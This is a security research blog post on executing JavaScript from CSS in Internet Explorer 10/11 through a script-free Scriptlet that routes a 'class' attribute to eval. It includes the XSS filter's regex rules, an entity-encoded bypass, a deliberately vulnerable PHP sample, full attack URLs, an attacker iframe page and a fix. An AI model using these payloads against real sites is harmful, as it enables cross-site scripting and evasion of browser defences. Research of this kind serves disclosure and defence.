# The Scriptless Scriptlet
#### Or how to execute JavaScript from CSS in MSIE11 without using Scripts

*Stop!* This text is only interesting for you if you...
* Like popping alerts in weird situations
* Miss CSS expressions as much as we do
* Have an unhealthy obsession for markup porn

### Introduction

Ever since the dawn of mankind, developers were eager to somehow make CSS more interactive. Some wanted direct JavaScript execution from CSS, others wanted to use bindings between scripts, XML files and behaviors to enrich the functionality of elements. None of the technologies browser vendors offered to accomplish that ever made it into any widely accepted standard - yet different technologies were blooming here and there, just to be deprecated a few months later.

As of today, we know a wide array of technologies to execute JavaScript from CSS in *legacy* browsers. CSS expressions, XML bindings, HTML Components, Opera's weird link behaviors and lastly, Scriptlets. This topic has recently been covered by our fellow team member Filedescriptor. He created an [XSS challenge](http://innerht.ml/challenges/kcal.pw/puzzle5.php) that seemed to be, well - close to impossible to solve. The solution to this challenge was to combine MSIE's double-parsing behavior for meta-elements with an [RPO attack](http://www.thespanner.co.uk/2014/03/21/rpo/) and a CSS injection that would allow deploying a Scriptlet. You can find all the details about the challenge and how to solve it at his [excellently written blog](http://blog.innerht.ml/cascading-style-scripting/).

Earlier sources of documentation, our own H5SC, also describe how Scriptlets can be used to [execute JavaScript from CSS](http://html5sec.org/?scriptlet#52). And, since we said legacy before... this even works in latest MSIE versions if the stars are aligned properly. But both the solution to Filedescriptor's Challenge as well as the available documentation are flawed for real life injection scenarios because of several reasons. We want to change that, do we?

### Scriptlets

[Scriptlets](https://msdn.microsoft.com/en-us/library/ms971094.aspx?f=255&MSPPError=-2147217396#allabout_topic7), contrary to [HTML Components](https://www.w3.org/TR/NOTE-HTMLComponents) (HTC) and alike are great for injection scenarios because they don't require a specific MIME type set to be loaded and executed. While an HTC must be delivered with MIME type `text/x-component`, a Scriptlet can be loaded with pretty much whatever MIME type. Could be a PDF, could be an image, could be `text/css` or even JSON. MSIE doesn't really care too much (there is minor restrictions when parsing magic-byte sequences like `GIF89a`). In addition, Scriptlets are parsed with an algorithm that is surprisingly tolerant. We will elaborate on this a bit later. 

There is but one problem: A Scriptlet only executes scripts when it embeds an actual *script* element. Let's look at a simple example:

*The injected file:*
```html
<div style="behavior:url(test.sct)"></div>
     ^- let's assume we injected that part
```

*The Scriptlet to execute JavaScript:*
```xml
<SCRIPTLET>
	<IMPLEMENTS Type="Behavior"></IMPLEMENTS>
	<SCRIPT Language="javascript">alert(1)</SCRIPT>
</SCRIPTLET>
  ^⁻ let's assume we can control something on the attacked domain to look like this
```

Did you notice? A script element can be found inside the Scriptlet.

### Problem Statement

As you can see, there is two problems. Problem number one: We have to somehow inject script to execute script. That might seem a bit pointless but it is not. Keep in mind, that we can also use pretty much any MIME type that would never render as a document. The Scriptlet, upon requested via `behavior:url()` would still execute, even if delivered as `image/gif` or `application/json` - normal HTML would of course not. So, it is not unlikely to be able to inject a Scriptlet into a non-HTML response and still find a use for it. 

But, there is another problem - [MSIE's XSS filter](http://stackoverflow.com/questions/2051632/ie8-xss-filter-what-does-it-really-do). This tool, one may think about it what one pleases to think, is effective against injections both delivering the Scriptlet code *and* the CSS snippet to include aforementioned Scriptlet. So, MSIE would stop both parts of the attack before they can be of any good use. 

Let's summarize: We have two limitations here. We cannot inject the Scriptlet code without MSIE's XSS filter noticing. And we cannot inject the style attribute that invokes the behavior property and its URL-function. Both attempts will be blocked. Can we get around that?

### Bypassing the Limitations

Of course we can. Let's tackle limitation number one first. Our research has shown, that there is yet another way of invoking code directly from a Scriptlet, without the need of using a script element. It was rather hard to learn about this, because there is pretty much no more useful documentation left online. All we found were these two links:

* http://www.drdobbs.com/scriptlets/199101569?pgno=2
* http://www.tek-tips.com/viewthread.cfm?qid=762034

From those, we can learn, that it is apparently possible to specify a special set of instructions to execute code in case certain properties are being *set* or *requested* as part of an *automation*. Let's have a look at this piece of code:

```xml
<scriptlet>
    <implements type="behavior" />
    <implements type="automation">
        <public:property name="class" put="eval" />
    </implements>
</scriptlet>
```

This Scriptlet doesn't use any script element but still implements a lot of logic. It will invoke the `eval` function in the global scope as soon as something sets a property called `class`. Note that this entire piece of XML does **not** trigger the XSS in any way. There is nothing evil in here [in the eyes of the filter and its obscure rules](http://pastebin.com/hecQRGVY). 

But how can we get to the point of setting a value for the property `class` so the `eval` method is being called? Let's have a look at the following HTML snippet:

```html
<span style="behavior:url('test.sct')" class="alert(1)"></span>
```

Wait, that is all? We only have to create a bit of HTML that first includes the Scriptlet (here, for simplicity sake as SCT file) and then defines a `class` attribute, that is set to "alert(1)"? Yep. While this does nothing bad in the HTML context, for the SCT context in the Scriptlet it is equivalent to setting a property by the name "class" with the value "alert(1)" that will be passed on directly to, guess what... the `eval` method. Yes, that actually works.

But we still have another problem to solve. Remember the second injection we would need? The part where we want to inject a style attribute or style element? We can get to the point of being able to inject the element or attribute without MSIE's XSS filter noticing, but we cannot sneak in any parenthesis or other evil CSS constructs. The filter blocks that with the following rules (taken from `EdgeHTML.dll` in July 2016):

```pcre
{[ /+\t\"\'`]st{y}le[ /+\t]*?=.*?([:=]|(&#x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&#x?0*((40)|(28)|(92)|(5C));?))}

{<([^ \t]+?:)?st{y}le.*?>.*?((@[i\\])|(([:=]|(&#x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&#x?0*((40)|(28)|(92)|(5C));?))))}
```

That means, even if we can get the Scriptless Scriptlet injected, we cannot inject any code that makes sure of its inclusion and then its execution. So, MSIE is blocking us again with its XSS filter, as flimsy as the rules may look, they are quite robust. 

But there is one problem for them rules. HTML5.

The authors of the MSIE XSS filter seem to be working under the assumption, that CSS injections can only do bad in very old browser versions or very old document modes. This is mostly true, but our research showed, that Scriptlets also work in MSIE10 document mode! And this mode is already aware of HTML5 and several of its features and novelties - including the ability to use [HTML5 Named Character References](https://dev.w3.org/html5/html-author/charref). That means, we don't have to rely on parenthesis anymore to include the Scriptlet and execute it. We can instead get there by simply using named entities the MSIE XSS filter doesn't really know yet. Let's assume the following two code snippets to be injected - one will be detected, one will not. Both will work in [MSIE10 document mode](https://cure53.de/xfo-clickjacking.pdf):

```html
// will work - but be detected by the MSIE XSS Filter
<span style="behavior:url('test.sct')" class="alert(1)"></span>

// will also work - but NOT be detected by the MSIE XSS Filter
<span style="behavior&colon;url&lpar;'test.sct'&rpar;" class="alert(1)"></span>
```

Wow. That clearly got us one step forward if not more. Now, let's have a look at an actual injection scenario:

```php
//injectable.php
<?php echo $_GET['xss']; ?>

//injectable-json.php
<?php
header('Content-Type: application/json');
?>
<?php echo $_GET['xss']; ?>({"a":"b"});
```

Now, all we have to do is use the following URL to pop a nice and clean alert and get JavaScript execution via CSS while at the same time bypassing the MSIE XSS filter even twice, once with the Scriptlet and then with the CSS injection. Mission accomplished.

```
Simple, isolated attack URL:
injectable.php?xss=<b style="behavior%26colon;url('injectable-json.php?xss=stuff%2520here%2520bla%2520%253Cscriptlet%253E%253Cimplements%2520type%253D%2522behavior%2522%2520/%253E%253Cimplements%2520type%253D%2522automation%2522%253E%253Cpublic%253Aproperty%2520name%253D%2522class%2522%2520put%253D%2522eval%2522%2520/%253E%253C/implements%253E%253C/scriptlet%253E')" class="alert%26lpar;1%26rpar;">
```

Ah, wait, we still have to Iframe the injected page from *attacker.com* by using this specific bit of code:

```html
<meta http-equiv="X-UA-Compatible" content="ie=10">
<iframe src="http://victim.com/injectable.php?xss=%3Cb%20style%3D%22behavior%2526colon%3Burl%28%27injectable-json.php%3Fxss%3Dstuff%252520here%252520bla%252520%25253Cscriptlet%25253E%25253Cimplements%252520type%25253D%252522behavior%252522%252520/%25253E%25253Cimplements%252520type%25253D%252522automation%252522%25253E%25253Cpublic%25253Aproperty%252520name%25253D%252522class%252522%252520put%25253D%252522eval%252522%252520/%25253E%25253C/implements%25253E%25253C/scriptlet%25253E%27%29%22%20class%3D%22alert%2526lpar%3B1%2526rpar%3B%22%3E"></iframe>
```

Looks complicated! Less encoding please!

```
injectable.php?xss=<b style="behavior&colon;url('injectable-json.php?xss=stuff%20here%20bla%20%3Cscriptlet%3E%3Cimplements%20type%3D%22behavior%22%20/%3E%3Cimplements%20type%3D%22automation%22%3E%3Cpublic%3Aproperty%20name%3D%22class%22%20put%3D%22eval%22%20/%3E%3C/implements%3E%3C/scriptlet%3E')" class="alert&lpar;1&rpar;">
```

Notice the following snippet? `stuff%2520here`? Yep, Scriptlet parsers, as mentioned earlier in this article, are more flexible than others. We can indeed prefix the Scriptlet XML with a lot of data and the parser will not care - making our injection even more likely to succeed if we inject into an exiting resource, like a CSS file, JSON file or alike. 

Sadly, we so far enumerated the following limitations for text pre-pending the actual Scriptlet code:

 * We cannot use nullbytes (Future work: Create a nullbyte-less yet valid image)
 * We cannot use ampersand (`&`) because XML
 * We cannot use lesser-than (`<`) because XML - but using greater-than is cool (`>`)
 
In summary, we **can** use Scriptlets in many scenarios already, such as JSONP, dynamic CSS, dynamic JavaScript, uploaded TXT files and alike. But we want to extend the attack surface even more of course. So, currently we are working on finding out, how we can make the attack be even more flexible by attempting to find ways to hide the Scriptlet in legitimate images, videos, PDFs and other document formats. We'll keep you posted about the findings, and are eager to hear your feedback :) 

### Demo

Click here to see the whole thing in action, use MSIE11 or older to pop the alert:

http://cure53.de/exchange/scriptlessscriptlet/attacker.html

### Fix

The entire attack can be thwarted by setting the `X-Content-Type-Options` HTTP header to `nosniff`. Like we do for example on our SSL-enabled website - look, no alert :) 

https://cure53.de/exchange/scriptlessscriptlet/attacker.html

 